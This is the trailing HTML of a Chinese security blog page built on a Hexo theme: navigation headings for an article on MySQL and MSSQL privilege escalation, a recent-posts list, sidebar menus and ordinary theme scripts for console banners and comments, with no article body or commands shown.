href="#3-%E5%88%9B%E5%BB%BAsys_eval-%E5%87%BD%E6%95%B0%E6%97%B6%E6%8F%90%E7%A4%BA%E5%B7%B2%E7%BB%8F%E5%AD%98%E5%9C%A8%E4%BD%86%E5%88%A9%E7%94%A8%E4%B8%8E%E5%88%A0%E9%99%A4%E6%97%B6%E6%8F%90%E7%A4%BA-sys_eval"><span class="toc-number">2.7.3.</span> <span class="toc-text">3、创建sys_eval 函数时提示已经存在，但利用与删除时提示 sys_eval</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-error-1126-hy000"><span class="toc-number">2.7.4.</span> <span class="toc-text">4、ERROR 1126 (HY000)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#28-%E4%BF%AE%E5%A4%8D%E5%BB%BA%E8%AE%AE"><span class="toc-number">2.8.</span> <span class="toc-text">2.8 修复建议</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x03-linux-udf%E6%8F%90%E6%9D%83"><span class="toc-number">3.</span> <span class="toc-text">0x03 Linux-UDF提权</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x04-mof-%E6%8F%90%E6%9D%83"><span class="toc-number">4.</span> <span class="toc-text">0x04 MOF 提权</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AE%80%E4%BB%8B"><span class="toc-number">4.1.</span> <span class="toc-text">简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-number">4.2.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E6%9D%83%E8%BF%87%E7%A8%8B"><span class="toc-number">4.3.</span> <span class="toc-text">提权过程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B8%85%E7%90%86%E7%97%95%E8%BF%B9"><span class="toc-number">4.4.</span> <span class="toc-text">清理痕迹</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#msf-mof%E6%A8%A1%E5%9D%97"><span class="toc-number">4.5.</span> <span class="toc-text">MSF MOF模块</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x05-%E5%90%AF%E5%8A%A8%E9%A1%B9%E6%8F%90%E6%9D%83"><span class="toc-number">5.</span> <span class="toc-text">0x05 启动项提权</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%90%AF%E5%8A%A8%E9%A1%B9%E8%B7%AF%E5%BE%84"><span class="toc-number">5.1.</span> <span class="toc-text">启动项路径</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#mysql%E5%86%99%E5%85%A5%E5%90%AF%E5%8A%A8%E9%A1%B9"><span class="toc-number">5.2.</span> <span class="toc-text">MySQL写入启动项</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#msf-%E5%90%AF%E5%8A%A8%E9%A1%B9%E6%8F%90%E6%9D%83"><span class="toc-number">5.3.</span> <span class="toc-text">MSF 启动项提权</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x06-mssql%E6%8F%90%E6%9D%83"><span class="toc-number">6.</span> <span class="toc-text">0x06 Mssql提权</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AF%86%E7%A0%81"><span class="toc-number">6.1.</span> <span class="toc-text">获取数据库密码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E5%AD%98%E5%82%A8%E8%BF%87%E7%A8%8B"><span class="toc-number">6.2.</span> <span class="toc-text">常见存储过程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AD%98%E5%82%A8%E8%BF%87%E7%A8%8B%E5%86%99webshell"><span class="toc-number">6.3.</span> <span class="toc-text">存储过程写webshell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B7%AE%E5%BC%82%E5%A4%87%E4%BB%BD%E5%86%99webshell"><span class="toc-number">6.4.</span> <span class="toc-text">差异备份写webshell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%97%A5%E5%BF%97%E5%A4%87%E4%BB%BD%E5%86%99webshell"><span class="toc-number">6.5.</span> <span class="toc-text">日志备份写webshell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sp_addextendedproc"><span class="toc-number">6.6.</span> <span class="toc-text">sp_addextendedproc</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#xp_cmdshell%E6%8F%90%E6%9D%83"><span class="toc-number">6.7.</span> <span class="toc-text">xp_cmdshell提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6"><span class="toc-number">6.7.1.</span> <span class="toc-text">利用条件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E8%BF%87%E7%A8%8B"><span class="toc-number">6.7.2.</span> <span class="toc-text">利用过程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E8%A7%81%E6%8A%A5%E9%94%99"><span class="toc-number">6.7.3.</span> <span class="toc-text">常见报错</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%97%95%E8%BF%B9%E6%B8%85%E7%90%86"><span class="toc-number">6.7.4.</span> <span class="toc-text">痕迹清理</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sp_oacreate%E6%8F%90%E6%9D%83"><span class="toc-number">6.8.</span> <span class="toc-text">sp_oacreate提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6"><span class="toc-number">6.8.1.</span> <span class="toc-text">利用条件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8F%90%E6%9D%83%E8%BF%87%E7%A8%8B"><span class="toc-number">6.8.2.</span> <span class="toc-text">提权过程</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#xp_regwrite%E6%8F%90%E6%9D%83"><span class="toc-number">6.9.</span> <span class="toc-text">xp_regwrite提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#agent-job%E6%8F%90%E6%9D%83"><span class="toc-number">6.10.</span> <span class="toc-text">Agent Job提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#clr%E6%8F%90%E6%9D%83"><span class="toc-number">6.11.</span> <span class="toc-text">CLR提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%A6%E5%8F%91%E5%99%A8%E6%8F%90%E6%9D%83"><span class="toc-number">6.12.</span> <span class="toc-text">触发器提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#mssql-r-%E5%92%8C-python-%E6%8F%90%E6%9D%83"><span class="toc-number">6.13.</span> <span class="toc-text">Mssql R 和 Python 提权</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B2%99%E7%9B%92%E6%8F%90%E6%9D%83"><span class="toc-number">6.14.</span> <span class="toc-text">沙盒提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%B8%80"><span class="toc-number">6.14.1.</span> <span class="toc-text">方法一</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%BA%8C"><span class="toc-number">6.15.</span> <span class="toc-text">方法二</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#mssql-%E6%A8%A1%E6%8B%9F%E7%99%BB%E5%BD%95%E6%8F%90%E6%9D%83"><span class="toc-number">6.16.</span> <span class="toc-text">Mssql 模拟登录提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8F%90%E6%9D%83%E8%BF%87%E7%A8%8B"><span class="toc-number">6.16.1.</span> <span class="toc-text">提权过程</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x07-powerupsql-mssql-%E5%88%A9%E7%94%A8%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8"><span class="toc-number">7.</span> <span class="toc-text">0x07 PowerUpSQL MSSQL 利用工具使用</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x08-%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="toc-number">8.</span> <span class="toc-text">0x08 参考文章</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="anzhiyufont anzhiyu-icon-history"></i><span>最近发布</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/21/thm-sha-he-gui-bi/" title="THM-沙盒规避">THM-沙盒规避</a><time datetime="2024-08-21T09:41:49.000Z" title="发表于 2024-08-21 17:41:49">2024-08-21</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/21/thm-fang-huo-qiang/" title="THM-防火墙">THM-防火墙</a><time datetime="2024-08-21T07:07:33.000Z" title="发表于 2024-08-21 15:07:33">2024-08-21</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/21/thm-wang-luo-an-quan-jie-jue-fang-an/" title="THM-网络安全解决方案">THM-网络安全解决方案</a><time datetime="2024-08-21T01:37:19.000Z" title="发表于 2024-08-21 09:37:19">2024-08-21</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/20/thm-kao-tu-di-wei-sheng/" title="THM-靠土地为生">THM-靠土地为生</a><time datetime="2024-08-20T10:08:09.000Z" title="发表于 2024-08-20 18:08:09">2024-08-20</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2024/08/20/thm-tao-bi-ri-zhi-ji-lu-he-jian-kong/" title="THM-逃避日志记录和监控">THM-逃避日志记录和监控</a><time datetime="2024-08-20T06:51:56.000Z" title="发表于 2024-08-20 14:51:56">2024-08-20</time></div></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"></div><div id="footer-bar"><div class="footer-bar-links"><div class="footer-bar-left"><div id="footer-bar-tips"><div class="copyright">&copy;2020 - 2024 By <a class="footer-bar-link" href="/" title="hybcx" target="_blank">hybcx</a></div></div><div id="footer-type-tips"></div></div><div class="footer-bar-right"><a class="footer-bar-link" target="_blank" rel="noopener" href="https://github.com/anzhiyu-c/hexo-theme-anzhiyu" title="主题">主题</a></div></div></div></footer></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="sidebar-site-data site-data is-center"><a href="/archives/" title="archive"><div class="headline">文章</div><div class="length-num">204</div></a><a href="/tags/" title="tag"><div class="headline">标签</div><div class="length-num">23</div></a><a href="/categories/" title="category"><div class="headline">分类</div><div class="length-num">30</div></a></div><span class="sidebar-menu-item-title">功能</span><div class="sidebar-menu-item"><a class="darkmode_switchbutton menu-child" href="javascript:void(0);" title="显示模式"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span>显示模式</span></a></div><div class="back-menu-list-groups"><div class="back-menu-list-group"><div class="back-menu-list-title">网页</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="https://blog.anheyu.com/" title="博客"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="/img/favicon.ico" alt="博客"/><span class="back-menu-item-text">博客</span></a></div></div><div class="back-menu-list-group"><div class="back-menu-list-title">项目</div><div class="back-menu-list"><a class="back-menu-item" target="_blank" rel="noopener" href="http://yansedaima.com/" title="颜色代码表"><img class="back-menu-item-icon" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.jsdelivr.net/gh/hybchenxing/blog-images/img/202408121908150.svg" alt="颜色代码表"/><span class="back-menu-item-text">颜色代码表</span></a></div></div></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-box-archive"></use></svg><span> 隧道</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-shapes"></use></svg><span> 分类</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-tags"></use></svg><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 友链</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/link/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-link"></use></svg><span> 友人帐</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/fcircle/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-artstation"></use></svg><span> 朋友圈</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 我的</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/music/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-music"></use></svg><span> 音乐馆</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 关于</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/about/"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-paper-plane"></use></svg><span> 关于本人</span></a></li><li><a class="site-page child faa-parent animated-hover" href="javascript:toRandomPost()"><svg class="icon faa-tada" aria-hidden="true"><use xlink:href="#icon-shoe-prints1"></use></svg><span> 随便逛逛</span></a></li></ul></div></div><span class="sidebar-menu-item-title">标签</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/CTF%E8%B5%9B%E4%BA%8B/" style="font-size: 0.88rem;">CTF赛事<sup>18</sup></a><a href="/tags/CVE/" style="font-size: 0.88rem;">CVE<sup>15</sup></a><a href="/tags/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="font-size: 0.88rem;">Java反序列化<sup>3</sup></a><a href="/tags/Java%E5%9F%BA%E7%A1%80/" style="font-size: 0.88rem;">Java基础<sup>1</sup></a><a href="/tags/Linux%E6%8F%90%E6%9D%83/" style="font-size: 0.88rem;">Linux提权<sup>2</sup></a><a href="/tags/MISC/" style="font-size: 0.88rem;">MISC<sup>1</sup></a><a href="/tags/Metasploit/" style="font-size: 0.88rem;">Metasploit<sup>3</sup></a><a href="/tags/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 0.88rem;">PHP代码审计<sup>2</sup></a><a href="/tags/SecBook/" style="font-size: 0.88rem;">SecBook<sup>1</sup></a><a href="/tags/TryHackMe/" style="font-size: 0.88rem;">TryHackMe<sup>42</sup></a><a href="/tags/Windows%E6%8F%90%E6%9D%83/" style="font-size: 0.88rem;">Windows提权<sup>2</sup></a><a href="/tags/reverse%E7%B3%BB%E5%88%97/" style="font-size: 0.88rem;">reverse系列<sup>2</sup></a><a href="/tags/tryhackme/" style="font-size: 0.88rem;">tryhackme<sup>1</sup></a><a href="/tags/web%E6%B8%97%E9%80%8F/" style="font-size: 0.88rem;">web渗透<sup>2</sup></a><a href="/tags/web%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/" style="font-size: 0.88rem;">web知识总结<sup>2</sup></a><a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" style="font-size: 0.88rem;">代码审计<sup>1</sup></a><a href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" style="font-size: 0.88rem;">内网渗透<sup>3</sup></a><a href="/tags/%E5%86%85%E7%BD%91%E9%9D%B6%E5%9C%BA/" style="font-size: 0.88rem;">内网靶场<sup>2</sup></a><a href="/tags/%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86/" style="font-size: 0.88rem;">基本知识<sup>21</sup></a><a href="/tags/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" style="font-size: 0.88rem;">基础知识<sup>1</sup></a><a href="/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/" style="font-size: 0.88rem;">攻防世界<sup>1</sup></a><a href="/tags/%E7%8E%84%E6%9C%BA%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E9%9D%B6%E5%9C%BA/" style="font-size: 0.88rem;">玄机应急响应靶场<sup>1</sup></a><a href="/tags/%E7%BA%A2%E9%98%9F%E6%B8%97%E9%80%8F/" style="font-size: 0.88rem;">红队渗透<sup>1</sup></a></div></div><hr/></div></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="anzhiyufont anzhiyu-icon-book-open"></i></button><button id="translateLink" type="button" title="简繁转换">繁</button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="anzhiyufont anzhiyu-icon-arrows-left-right"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="anzhiyufont anzhiyu-icon-gear"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="anzhiyufont anzhiyu-icon-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="anzhiyufont anzhiyu-icon-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></button></div></div><div id="nav-music"><a id="nav-music-hoverTips" onclick="anzhiyu.musicToggle()" accesskey="m">播放音乐</a><div id="console-music-bg"></div><meting-js id="8152976493" server="netease" type="playlist" mutex="true" preload="none" theme="var(--anzhiyu-main)" data-lrctype="0" order="random" volume="0.7"></meting-js></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="anzhiyufont anzhiyu-icon-xmark"></i></button></nav><div class="is-center" id="loading-database"><i class="anzhiyufont anzhiyu-icon-spinner anzhiyu-pulse-icon"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div id="rightMenu"><div class="rightMenu-group rightMenu-small"><div class="rightMenu-item" id="menu-backward"><i class="anzhiyufont anzhiyu-icon-arrow-left"></i></div><div class="rightMenu-item" id="menu-forward"><i class="anzhiyufont anzhiyu-icon-arrow-right"></i></div><div class="rightMenu-item" id="menu-refresh"><i class="anzhiyufont anzhiyu-icon-arrow-rotate-right" style="font-size: 1rem;"></i></div><div class="rightMenu-item" id="menu-top"><i class="anzhiyufont anzhiyu-icon-arrow-up"></i></div></div><div class="rightMenu-group rightMenu-line rightMenuPlugin"><div class="rightMenu-item" id="menu-copytext"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制选中文本</span></div><div class="rightMenu-item" id="menu-pastetext"><i class="anzhiyufont anzhiyu-icon-paste"></i><span>粘贴文本</span></div><a class="rightMenu-item" id="menu-commenttext"><i class="anzhiyufont anzhiyu-icon-comment-medical"></i><span>引用到评论</span></a><div class="rightMenu-item" id="menu-newwindow"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开</span></div><div class="rightMenu-item" id="menu-copylink"><i class="anzhiyufont anzhiyu-icon-link"></i><span>复制链接地址</span></div><div class="rightMenu-item" id="menu-copyimg"><i class="anzhiyufont anzhiyu-icon-images"></i><span>复制此图片</span></div><div class="rightMenu-item" id="menu-downloadimg"><i class="anzhiyufont anzhiyu-icon-download"></i><span>下载此图片</span></div><div class="rightMenu-item" id="menu-newwindowimg"><i class="anzhiyufont anzhiyu-icon-window-restore"></i><span>新窗口打开图片</span></div><div class="rightMenu-item" id="menu-search"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>站内搜索</span></div><div class="rightMenu-item" id="menu-searchBaidu"><i class="anzhiyufont anzhiyu-icon-magnifying-glass"></i><span>百度搜索</span></div><div class="rightMenu-item" id="menu-music-toggle"><i class="anzhiyufont anzhiyu-icon-play"></i><span>播放音乐</span></div><div class="rightMenu-item" id="menu-music-back"><i class="anzhiyufont anzhiyu-icon-backward"></i><span>切换到上一首</span></div><div class="rightMenu-item" id="menu-music-forward"><i class="anzhiyufont anzhiyu-icon-forward"></i><span>切换到下一首</span></div><div class="rightMenu-item" id="menu-music-playlist" onclick="window.open(&quot;https://y.qq.com/n/ryqq/playlist/8802438608&quot;, &quot;_blank&quot;);" style="display: none;"><i class="anzhiyufont anzhiyu-icon-radio"></i><span>查看所有歌曲</span></div><div class="rightMenu-item" id="menu-music-copyMusicName"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制歌名</span></div></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item menu-link" id="menu-randomPost"><i class="anzhiyufont anzhiyu-icon-shuffle"></i><span>随便逛逛</span></a><a class="rightMenu-item menu-link" href="/categories/"><i class="anzhiyufont anzhiyu-icon-cube"></i><span>博客分类</span></a><a class="rightMenu-item menu-link" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags"></i><span>文章标签</span></a></div><div class="rightMenu-group rightMenu-line rightMenuOther"><a class="rightMenu-item" id="menu-copy" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-copy"></i><span>复制地址</span></a><a class="rightMenu-item" id="menu-commentBarrage" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-message"></i><span class="menu-commentBarrage-text">关闭热评</span></a><a class="rightMenu-item" id="menu-darkmode" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-circle-half-stroke"></i><span class="menu-darkmode-text">深色模式</span></a><a class="rightMenu-item" id="menu-translate" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-language"></i><span>轉為繁體</span></a></div></div><div id="rightmenu-mask"></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/tw_cn.js"></script><script src="https://cdn.cbd.int/medium-zoom@1.1.0/dist/medium-zoom.min.js"></script><script src="https://cdn.cbd.int/instant.page@5.2.0/instantpage.js" type="module"></script><script src="https://cdn.cbd.int/vanilla-lazyload@17.8.5/dist/lazyload.iife.min.js"></script><script src="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.js"></script><canvas id="universe"></canvas><script async src="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.0/dark/dark.js"></script><script>// 消除控制台打印
var HoldLog = console.log;
console.log = function () {};
let now1 = new Date();
queueMicrotask(() => {
  const Log = function () {
    HoldLog.apply(console, arguments);
  }; //在恢复前输出日志
  const grt = new Date("04/01/2021 00:00:00"); //此处修改你的建站时间或者网站上线时间
  now1.setTime(now1.getTime() + 250);
  const days = (now1 - grt) / 1000 / 60 / 60 / 24;
  const dnum = Math.floor(days);
  const ascll = [
    `欢迎使用安知鱼!`,
    `生活明朗, 万物可爱`,
    `
        
       █████╗ ███╗   ██╗███████╗██╗  ██╗██╗██╗   ██╗██╗   ██╗
      ██╔══██╗████╗  ██║╚══███╔╝██║  ██║██║╚██╗ ██╔╝██║   ██║
      ███████║██╔██╗ ██║  ███╔╝ ███████║██║ ╚████╔╝ ██║   ██║
      ██╔══██║██║╚██╗██║ ███╔╝  ██╔══██║██║  ╚██╔╝  ██║   ██║
      ██║  ██║██║ ╚████║███████╗██║  ██║██║   ██║   ╚██████╔╝
      ╚═╝  ╚═╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝╚═╝   ╚═╝    ╚═════╝
        
        `,
    "已上线",
    dnum,
    "天",
    "©2020 By 安知鱼 V1.6.12",
  ];
  const ascll2 = [`NCC2-036`, `调用前置摄像头拍照成功，识别为【小笨蛋】.`, `Photo captured: `, `🤪`];

  setTimeout(
    Log.bind(
      console,
      `\n%c${ascll[0]} %c ${ascll[1]} %c ${ascll[2]} %c${ascll[3]}%c ${ascll[4]}%c ${ascll[5]}\n\n%c ${ascll[6]}\n`,
      "color:#425AEF",
      "",
      "color:#425AEF",
      "color:#425AEF",
      "",
      "color:#425AEF",
      ""
    )
  );
  setTimeout(
    Log.bind(
      console,
      `%c ${ascll2[0]} %c ${ascll2[1]} %c \n${ascll2[2]} %c\n${ascll2[3]}\n`,
      "color:white; background-color:#4fd953",
      "",
      "",
      'background:url("https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/tinggge.gif") no-repeat;font-size:450%'
    )
  );

  setTimeout(Log.bind(console, "%c WELCOME %c 你好，小笨蛋.", "color:white; background-color:#4f90d9", ""));

  setTimeout(
    console.warn.bind(
      console,
      "%c ⚡ Powered by 安知鱼 %c 你正在访问 hybcx 的博客.",
      "color:white; background-color:#f0ad4e",
      ""
    )
  );

  setTimeout(Log.bind(console, "%c W23-12 %c 你已打开控制台.", "color:white; background-color:#4f90d9", ""));

  setTimeout(
    console.warn.bind(console, "%c S013-782 %c 你现在正处于监控中.", "color:white; background-color:#d9534f", "")
  );
});</script><script async src="/anzhiyu/random.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"><script>(() => {
  const initValine = () => {
    const valine = new Valine(Object.assign({
      el: '#vcomment',
      appId: '7Sc5uZwcoDwvbgqkpwGKyCpN-gzGzoHsz',
      appKey: 'iEFJUGMm2FY91n9ZG1gdKBSy',
      avatar: 'mp',
      serverURLs: '',
      emojiMaps: "",
      path: window.location.pathname,
      visitor: false
    }, null))
  }

  const loadValine = async () => {
    if (typeof Valine === 'function') initValine()
    else {
      await getScript('https://cdn.cbd.int/valine@1.5.1/dist/Valine.min.js')
      initValine()
    }
  }

  if ('Valine' === 'Valine' || !false) {
    if (false) anzhiyu.loadComment(document.getElementById('vcomment'),loadValine)
    else setTimeout(loadValine, 0)
  } else {
    window.loadOtherComment = loadValine
  }
})()</script><input type="hidden" name="page-type" id="page-type" value="post"></div><script src="https://cdn.cbd.int/blueimp-md5@2.19.0/js/md5.min.js"></script><script>window.addEventListener('load', () => {
  const changeContent = (content) => {
    if (content === '') return content

    content = content.replace(/<img.*?src="(.*?)"?[^\>]+>/ig, '[图片]') // replace image link
    content = content.replace(/<a[^>]+?href=["']?([^"']+)["']?[^>]*>([^<]+)<\/a>/gi, '[链接]') // replace url
    content = content.replace(/<pre><code>.*?<\/pre>/gi, '[代码]') // replace code
    content = content.replace(/<[^>]+>/g,"") // remove html tag

    if (content.length > 150) {
      content = content.substring(0,150) + '...'
    }
    return content
  }

  const getIcon = (icon, mail) => {
    if (icon) return icon
    let defaultIcon = '?d=mp'
    let iconUrl = `https://gravatar.loli.net/avatar/${md5(mail.toLowerCase()) + defaultIcon}`
    return iconUrl
  }

  const generateHtml = array => {
    let result = ''

    if (array.length) {
      for (let i = 0; i < array.length; i++) {
        result += '<div class=\'aside-list-item\'>'

        if (true) {
          const name = 'data-lazy-src'
          result += `<a href='${array[i].url}' class='thumbnail'><img ${name}='${array[i].avatar}' alt='${array[i].nick}'></a>`
        }

        result += `<div class='content'>
        <a class='comment' href='${array[i].url}' title='${array[i].content}'>${array[i].content}</a>
        <div class='name'><span>${array[i].nick} / </span><time datetime="${array[i].date}">${anzhiyu.diffDate(array[i].date, true)}</time></div>
        </div></div>`
      }
    } else {
      result += '没有评论'
    }

    let $dom = document.querySelector('#card-newest-comments .aside-list')
    $dom && ($dom.innerHTML= result)
    window.lazyLoadInstance && window.lazyLoadInstance.update()
    window.pjax && window.pjax.refresh($dom)
  }

  const getComment = () => {
    const serverURL = 'https://7Sc5uZwc.api.lncldglobal.com'

    var settings = {
      "method": "GET",
      "headers": {
        "X-LC-Id": '7Sc5uZwcoDwvbgqkpwGKyCpN-gzGzoHsz',
        "X-LC-Key": 'iEFJUGMm2FY91n9ZG1gdKBSy',
        "Content-Type": "application/json"
      },
    }

    fetch(`${serverURL}/1.1/classes/Comment?limit=6&order=-createdAt`,settings)
      .then(response => response.json())
      .then(data => {
        const valineArray = data.results.map(function (e) {
          return {
            'avatar': getIcon(e.QQAvatar, e.mail),
            'content': changeContent(e.comment),
            'nick': e.nick,
            'url': e.url + '#' + e.objectId,
            'date': e.updatedAt,
          }
        })
        saveToLocal.set('valine-newest-comments', JSON.stringify(valineArray), 10/(60*24))
        generateHtml(valineArray)
      }).catch(e => {
        const $dom = document.querySelector('#card-newest-comments .aside-list')
        $dom.textContent= "无法获取评论，请确认相关配置是否正确"
      }) 
  }

  const newestCommentInit = () => {
    if (document.querySelector('#card-newest-comments .aside-list')) {
      const data = saveToLocal.get('valine-newest-comments')
      if (data) {
        generateHtml(JSON.parse(data))
      } else {
        getComment()
      }
    }
  }

  newestCommentInit()
  document.addEventListener('pjax:complete', newestCommentInit)
})</script><script async data-pjax src="https://npm.elemecdn.com/anzhiyu-theme-static@1.0.1/bubble/bubble.js"></script><script>var visitorMail = "";
